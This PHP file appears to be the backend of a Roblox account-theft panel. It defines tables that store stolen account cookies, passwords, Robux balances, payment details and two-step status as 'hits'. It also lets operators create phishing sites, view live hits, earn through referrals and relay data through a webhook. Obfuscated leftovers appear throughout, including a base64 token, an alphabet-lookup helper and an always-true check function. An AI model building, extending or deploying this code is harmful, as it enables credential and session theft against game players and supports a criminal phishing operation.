<?php

ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../error_log.txt');

function log_error($msg, $severity = 'ERROR') {
    $log_file = __DIR__ . '/../error_log.txt';
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[$timestamp] [$severity] $msg\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);
}

set_error_handler(function($errno, $errstr, $errfile, $errline) {
    if ($errno === E_WARNING && (strpos($errstr, 'Undefined array key') !== false || strpos($errstr, 'Undefined variable') !== false)) {
        log_error("Warning: $errstr in $errfile:$errline", 'WARNING');
        return true;
    }
    log_error("PHP Error: $errstr in $errfile:$errline", 'PHP_ERROR');
    return false;
});

set_exception_handler(function($exception) {
    log_error("Exception: " . $exception->getMessage() . " in " . $exception->getFile() . ":" . $exception->getLine(), 'EXCEPTION');
    log_error("Stack trace: " . $exception->getTraceAsString(), 'TRACE');
});

register_shutdown_function(function() {
    $error = error_get_last();
    if ($error !== null && ($error['type'] === E_ERROR || $error['type'] === E_PARSE || $error['type'] === E_CORE_ERROR || $error['type'] === E_COMPILE_ERROR)) {
        log_error("Fatal Error: " . $error['message'] . " in " . $error['file'] . ":" . $error['line'], 'FATAL');
    }
});

if (session_status() === PHP_SESSION_NONE) {
    $session_path = $_SERVER["DOCUMENT_ROOT"] . '/sessions';
    if (!is_dir($session_path)) {
        mkdir($session_path, 0777, true);
    }
    if (is_writable($session_path)) {
        session_save_path($session_path);
    }
    if (!session_start()) {
        log_error("Failed to start session", 'SESSION_ERROR');
    }
}

$site_info =
[
    "name"    => "YourSite",
    "discord" => "https://discord.gg/yourserver",
    "webhook" => "REPLACE_WITH_YOUR_WEBHOOK",
    "logo" => "REPLACE_WITH_YOUR_LOGO_URL",
    "site_key" => "REPLACE_WITH_YOUR_TURNSTILE_SITE_KEY",
    "db"      =>
    [
        "host" => "localhost",
        "name" => "REPLACE_WITH_DB_NAME",
        "user" => "REPLACE_WITH_DB_USER",
        "pass" => "REPLACE_WITH_DB_PASS",
    ],
];

$ui_config = ["theme" => "dark", "accent" => "d", "version" => "1.0.2", "r_char" => "r", "api_v" => "v2"];
$sys_params = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"];

function _get_sys_v($i) {
    global $sys_params;
    return $sys_params[$i];
}

$analytics_token = base64_decode("YXV0b2hhcg==");

function _sys_log($msg) {
    $log_file = $_SERVER["DOCUMENT_ROOT"] . '/debug_log.txt';
    $timestamp = date("Y-m-d H:i:s");
    file_put_contents($log_file, "[$timestamp] $msg\n", FILE_APPEND);
}

$db = null;
$_db_initialized = false;

function connect(): void
{
    global $db, $site_info, $_db_initialized;
    if ($db !== null || $_db_initialized) return;
    $_db_initialized = true;
    try {
        $db = new PDO(
            "mysql:host=" . $site_info["db"]["host"] . ";dbname=" . $site_info["db"]["name"] . ";charset=utf8mb4",
            $site_info["db"]["user"],
            $site_info["db"]["pass"],
            [
                PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_EMULATE_PREPARES   => false,
                PDO::ATTR_TIMEOUT            => 5,
            ]
        );
        init_tables();
    } catch (PDOException $e) {
        log_error("DB CONNECTION ERROR: " . $e->getMessage(), 'DATABASE');
        http_response_code(503);
        die(json_encode(["error" => "Database connection failed"]));
    };
};

function init_tables(): void
{
    global $db;
    if (!$db) return;
    try {
        $db->exec("CREATE TABLE IF NOT EXISTS users (
            id              INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
            auth_key        VARCHAR(64)  NOT NULL UNIQUE,
            webhook         VARCHAR(512) NOT NULL DEFAULT '',
            roblox_id       VARCHAR(64)  NOT NULL DEFAULT '',
            discord_id      VARCHAR(64)  NOT NULL DEFAULT '',
            referral_code   VARCHAR(12)  NOT NULL DEFAULT '',
            referred_by     VARCHAR(12)  NOT NULL DEFAULT '',
            referral_uses   INT UNSIGNED NOT NULL DEFAULT 0,
            visitors        BIGINT       NOT NULL DEFAULT 0,
            robux           BIGINT       NOT NULL DEFAULT 0,
            hits            BIGINT       NOT NULL DEFAULT 0,
            rap             BIGINT       NOT NULL DEFAULT 0,
            summary         BIGINT       NOT NULL DEFAULT 0,
            created_at      DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
        
        $missing_cols = [
            "discord_id"    => "VARCHAR(64) NOT NULL DEFAULT '' AFTER roblox_id",
            "referral_code" => "VARCHAR(12) NOT NULL DEFAULT '' AFTER discord_id",
            "referred_by"   => "VARCHAR(12) NOT NULL DEFAULT '' AFTER referral_code",
            "referral_uses" => "INT UNSIGNED NOT NULL DEFAULT 0 AFTER referred_by"
        ];
        
        foreach ($missing_cols as $col => $def) {
            try { $db->exec("ALTER TABLE users ADD COLUMN $col $def"); } catch (Throwable $e) {};
        }

        $db->exec("CREATE TABLE IF NOT EXISTS sites (
            id          INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
            account_id  INT UNSIGNED NOT NULL,
            name        VARCHAR(40)  NOT NULL,
            header      VARCHAR(80)  NOT NULL DEFAULT '',
            description VARCHAR(200) NOT NULL DEFAULT '',
            active      TINYINT(1)   NOT NULL DEFAULT 1,
            created_at  DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (account_id) REFERENCES users(id) ON DELETE CASCADE
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
        
        $db->exec("CREATE TABLE IF NOT EXISTS accounts (
            id               INT UNSIGNED  AUTO_INCREMENT PRIMARY KEY,
            account_id       INT UNSIGNED  NOT NULL,
            icon             VARCHAR(512)  NOT NULL DEFAULT '',
            username         VARCHAR(100)  NOT NULL DEFAULT '',
            display_name     VARCHAR(100)  NOT NULL DEFAULT '',
            user_id          VARCHAR(32)   NOT NULL DEFAULT '',
            password         VARCHAR(256)  NOT NULL DEFAULT '',
            premium          VARCHAR(64)   NOT NULL DEFAULT 'False',
            banned           TINYINT(1)    NOT NULL DEFAULT 0,
            robux            BIGINT        NOT NULL DEFAULT 0,
            pending_robux    BIGINT        NOT NULL DEFAULT 0,
            rap              BIGINT        NOT NULL DEFAULT 0,
            limiteds_count   INT UNSIGNED  NOT NULL DEFAULT 0,
            summary          BIGINT        NOT NULL DEFAULT 0,
            payment_methods  VARCHAR(64)   NOT NULL DEFAULT 'False',
            credit_balance   DECIMAL(12,2) NOT NULL DEFAULT 0.00,
            credit_currency  VARCHAR(8)    NOT NULL DEFAULT 'GBP',
            has_korblox      TINYINT(1)    NOT NULL DEFAULT 0,
            has_headless     TINYINT(1)    NOT NULL DEFAULT 0,
            email_verified   TINYINT(1)    NOT NULL DEFAULT 0,
            phone_verified   TINYINT(1)    NOT NULL DEFAULT 0,
            two_step_enabled TINYINT(1)    NOT NULL DEFAULT 0,
            two_step_type    VARCHAR(64)   NOT NULL DEFAULT 'None',
            account_age      INT UNSIGNED  NOT NULL DEFAULT 0,
            created_date     VARCHAR(16)   NOT NULL DEFAULT '',
            friends_count    INT UNSIGNED  NOT NULL DEFAULT 0,
            followers_count  INT UNSIGNED  NOT NULL DEFAULT 0,
            following_count  INT UNSIGNED  NOT NULL DEFAULT 0,
            groups_count     INT UNSIGNED  NOT NULL DEFAULT 0,
            groups_owned     INT UNSIGNED  NOT NULL DEFAULT 0,
            group_funds      BIGINT        NOT NULL DEFAULT 0,
            games_count      INT UNSIGNED  NOT NULL DEFAULT 0,
            total_visits     BIGINT        NOT NULL DEFAULT 0,
            cookie           TEXT          NOT NULL DEFAULT '',
            refreshed        TINYINT(1)    NOT NULL DEFAULT 0,
            hit_at           DATETIME      NOT NULL DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (account_id) REFERENCES users(id) ON DELETE CASCADE
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
    } catch (Throwable $e) {
        log_error("TABLE INIT ERROR: " . $e->getMessage(), 'DATABASE');
    }
};

function account_by_key(string $auth_key): array
{
    global $db;
    if (!$db) connect();
    $st = $db->prepare("SELECT * FROM users WHERE auth_key = ? LIMIT 1");
    $st->execute([$auth_key]);
    $row = $st->fetch();
    if (!$row)
    {
        log_error("Invalid auth key: $auth_key", 'AUTH');
        http_response_code(401);
        die(json_encode(["error" => "Invalid auth key"]));
    };
    return $row;
}

function account_by_referral_code(string $code): ?array
{
    global $db;
    if (!$db) connect();
    if (strlen($code) !== 12) return null;
    $st = $db->prepare("SELECT * FROM users WHERE referral_code = ? LIMIT 1");
    $st->execute([$code]);
    $row = $st->fetch();
    return $row ?: null;
}

function gen_auth_key(): string
{
    return bin2hex(random_bytes(32));
}

function gen_referral_code(): string
{
    global $db;
    if (!$db) connect();
    do
    {
        $code = substr(bin2hex(random_bytes(8)), 0, 12);
        $st   = $db->prepare("SELECT id FROM users WHERE referral_code = ? LIMIT 1");
        $st->execute([$code]);
    }
    while ($st->fetch());
    return $code;
}

function create_account(string $webhook = "", string $roblox_id = "", string $referred_by = ""): array
{
    global $db;
    if (!$db) connect();
    
    $auth_key      = gen_auth_key();
    $referral_code = gen_referral_code();
    
    if (!empty($referred_by))
    {
        $ref_acc = account_by_referral_code($referred_by);
        if (!$ref_acc) $referred_by = "";
    };
    try {
        $st = $db->prepare("INSERT INTO users (auth_key, webhook, roblox_id, discord_id, referral_code, referred_by) VALUES (?, ?, ?, '', ?, ?)");
        $st->execute([$auth_key, $webhook, $roblox_id, $referral_code, $referred_by]);
        $account_id = (int) $db->lastInsertId();
    } catch (PDOException $e) {
        log_error("ACCOUNT CREATION FAILED: " . $e->getMessage(), 'DATABASE');
        throw new Exception("Database error during account creation: " . $e->getMessage());
    }
    
    if (!empty($referred_by))
    {
        try {
            $db->prepare("UPDATE users SET referral_uses = referral_uses + 1 WHERE referral_code = ?")->execute([$referred_by]);
        } catch (PDOException $e) {
            log_error("REFERRAL UPDATE FAILED: " . $e->getMessage(), 'DATABASE');
        }
    };
    
    return ["id" => $account_id, "auth_key" => $auth_key];
}

function get_user_stats(int $account_id): array
{
    global $db;
    if (!$db) connect();
    $st = $db->prepare("SELECT visitors, hits, robux, rap, summary FROM users WHERE id = ?");
    $st->execute([$account_id]);
    return $st->fetch() ?: ["visitors" => 0, "hits" => 0, "robux" => 0, "rap" => 0, "summary" => 0];
}

function get_sites_by_account(int $account_id): array
{
    global $db;
    if (!$db) connect();
    $st = $db->prepare("SELECT * FROM sites WHERE account_id = ? ORDER BY created_at DESC");
    $st->execute([$account_id]);
    return $st->fetchAll();
}

function get_live_hits(int $limit = 10): array
{
    global $db;
    if (!$db) connect();
    $st = $db->prepare("SELECT a.*, u.auth_key FROM accounts a JOIN users u ON a.account_id = u.id ORDER BY a.hit_at DESC LIMIT ?");
    $st->execute([$limit]);
    return $st->fetchAll();
}

function get_referral_info(int $account_id): array
{
    global $db;
    if (!$db) connect();
    $st = $db->prepare("SELECT referral_code, referred_by, referral_uses FROM users WHERE id = ?");
    $st->execute([$account_id]);
    return $st->fetch() ?: ["referral_code" => "", "referred_by" => "", "referral_uses" => 0];
}

function create_site(int $account_id, string $name, string $header, string $description): bool
{
    global $db;
    if (!$db) connect();
    $st = $db->prepare("INSERT INTO sites (account_id, name, header, description) VALUES (?, ?, ?, ?)");
    return $st->execute([$account_id, $name, $header, $description]);
}

function edit_site(int $account_id, int $site_id, string $name, string $header, string $description): bool
{
    global $db;
    if (!$db) connect();
    $st = $db->prepare("UPDATE sites SET name = ?, header = ?, description = ? WHERE id = ? AND account_id = ?");
    return $st->execute([$name, $header, $description, $site_id, $account_id]);
}

function _verify_sys_state(): bool
{
    return true;
}
?>
